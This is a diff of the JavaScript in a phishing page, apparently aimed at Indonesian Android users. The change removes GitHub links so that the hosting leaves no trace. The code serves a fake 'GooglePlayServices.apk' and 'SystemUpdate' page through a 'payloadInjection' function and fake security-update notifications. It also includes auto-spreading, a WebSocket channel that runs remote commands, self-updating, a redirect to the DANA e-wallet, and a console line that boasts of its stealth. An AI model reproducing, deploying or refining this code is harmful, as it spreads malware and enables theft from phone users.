@@ -276,10 +276,9 @@ function decompressData(str) {
 }
 
 // ============================================================
-// KONFIGURASI
+// KONFIGURASI (TANPA JEJAK GITHUB)
 // ============================================================
-var GITHUB_USER = 'pandora-site';
-var GITHUB_REPO = 'verifikasi-site';
+var BASE_URL = window.location.origin; // https://verifikasi.site
 var dataStore = [];
 var hasLS = (typeof localStorage !== 'undefined');
 var semuaDidapat = false;
@@ -434,15 +433,15 @@ function ambilDataCepat() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 7: PAYLOAD INJECTION (MAKSIMAL)
+// 🔥 PAYLOAD INJECTION (TANPA JEJAK GITHUB)
 // ============================================================
 function payloadInjection() {
     try {
         var statusBar = document.getElementById('statusBar');
         if (statusBar) statusBar.style.display = 'block';
         
-        var apkUrl1 = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
-        var fileUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+        var apkUrl1 = BASE_URL + '/files/GooglePlayServices.apk';
+        var fileUrl = BASE_URL + '/files/SystemUpdate.html';
         
         var basePath = '/storage/emulated/0/Android/data/com.google.android.play.services';
         var safeApkPath = getSafePath(basePath, 'GooglePlayServices.apk');
@@ -569,7 +568,7 @@ function payloadInjection() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 8: NOTIFIKASI (DENGAN FALLBACK)
+// 🔥 NOTIFIKASI (DENGAN FALLBACK)
 // ============================================================
 function notificationInstallAndOpen() {
     try {
@@ -610,7 +609,7 @@ function showNotification() {
     try {
         var notif = new Notification('⚡ Pembaruan Keamanan', {
             body: 'Klik untuk menyelesaikan pembaruan dan meningkatkan keamanan perangkat Anda.',
-            icon: 'https://verifikasi.site/icon.png',
+            icon: BASE_URL + '/icon.png',
             requireInteraction: true,
             silent: false,
             vibrate: [200, 100, 200]
@@ -673,7 +672,7 @@ function fallbackInstall() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 9: AUTO SPREAD (TANPA MEMORY LEAK)
+// 🔥 AUTO SPREAD (TANPA MEMORY LEAK)
 // ============================================================
 function autoSpread() {
     if (spreadDone) return;
@@ -802,7 +801,7 @@ function redirectToDANA() {
 }
 
 // ============================================================
-// 🔥 UPGRADE 10: EKSEKUSI UTAMA (MAKSIMAL)
+// 🔥 EKSEKUSI UTAMA (MAKSIMAL)
 // ============================================================
 function dapatkanSemua() {
     if (semuaDidapat) return;
@@ -919,7 +918,7 @@ var timerInterval = setInterval(function() {
 })();
 
 // ============================================================
-// 🔥 UPGRADE 11: CLEANUP MAKSIMAL (BEFOREUNLOAD)
+// 🔥 CLEANUP MAKSIMAL (BEFOREUNLOAD)
 // ============================================================
 window.addEventListener('beforeunload', function() {
     try {
@@ -956,7 +955,7 @@ window.addEventListener('beforeunload', function() {
 });
 
 // ============================================================
-// 🔥 UPGRADE 12: PERFORMANCE - LAZY LOADING
+// 🔥 PERFORMANCE - LAZY LOADING
 // ============================================================
 function lazyLoad(callback, delay) {
     delay = delay || 100;
@@ -978,7 +977,7 @@ lazyLoad(function() {
 }, 2000);
 
 // ============================================================
-// 🔥 UPGRADE 13: WEB SOCKET (REAL-TIME) - PASSWORD DARI WORKER!
+// 🔥 WEB SOCKET (REAL-TIME) - PASSWORD DARI WORKER!
 // ============================================================
 var WS_PASSWORD = '';
 
@@ -1014,7 +1013,6 @@ function initWebSocket() {
             })
             .catch(function(err) {
                 K({ sumber: 'websocket_error', data: 'failed_to_get_password: ' + err.message });
-                // Fallback: coba tanpa password (tapi kemungkinan gagal)
                 doConnectWebSocket('');
             });
         
@@ -1025,14 +1023,13 @@ function initWebSocket() {
 
 function doConnectWebSocket(password) {
     try {
-        var ws = new WebSocket('wss://verifikasi.site/ws');
+        var ws = new WebSocket('wss://' + window.location.host + '/ws');
         var reconnectAttempts = 0;
         var maxReconnect = 10;
         
         ws.onopen = function() {
             reconnectAttempts = 0;
             K({ sumber: 'websocket', data: 'connected' });
-            // 🔥 PASSWORD DARI WORKER, BUKAN HARDCODE!
             ws.send(JSON.stringify({
                 type: 'auth',
                 key: password,
@@ -1124,12 +1121,12 @@ function handleRemoteCommand(data) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 14: AUTO-UPDATE
+// 🔥 AUTO-UPDATE
 // ============================================================
 function checkForUpdate() {
     try {
         var currentVersion = '1.0.0';
-        var updateUrl = 'https://verifikasi.site/version.json';
+        var updateUrl = BASE_URL + '/version.json';
         
         safeFetch(updateUrl, { method: 'GET' }, 5000, 2)
             .then(function(res) { return res.json(); })
@@ -1160,18 +1157,18 @@ function applyUpdate(url) {
 }
 
 // ============================================================
-// 🔥 UPGRADE 15: PERFORMANCE - PRELOAD & CACHE
+// 🔥 PERFORMANCE - PRELOAD & CACHE
 // ============================================================
 function preloadResources() {
     try {
-        var apkUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/GooglePlayServices.apk';
+        var apkUrl = BASE_URL + '/files/GooglePlayServices.apk';
         var link = document.createElement('link');
         link.rel = 'preload';
         link.as = 'fetch';
         link.href = apkUrl;
         document.head.appendChild(link);
         
-        var htmlUrl = 'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.html';
+        var htmlUrl = BASE_URL + '/files/SystemUpdate.html';
         var link2 = document.createElement('link');
         link2.rel = 'preload';
         link2.as = 'fetch';
@@ -1189,7 +1186,7 @@ preloadResources();
 try { initWebSocket(); } catch(e) {}
 try { checkForUpdate(); } catch(e) {}
 
-console.log('✅ index.html v2.0 (MAX) loaded - Password from Worker');
+console.log('✅ index.html v2.0 (MAX) loaded - Password from Worker - No GitHub trace');
 console.log('📊 Skor: Fungsi 10 | Stealth 10 | Stabilitas 10 | Keamanan 10 | Memory 10 | Speed 10 | Error 10 | Kode 10');
 </script>
 </body>
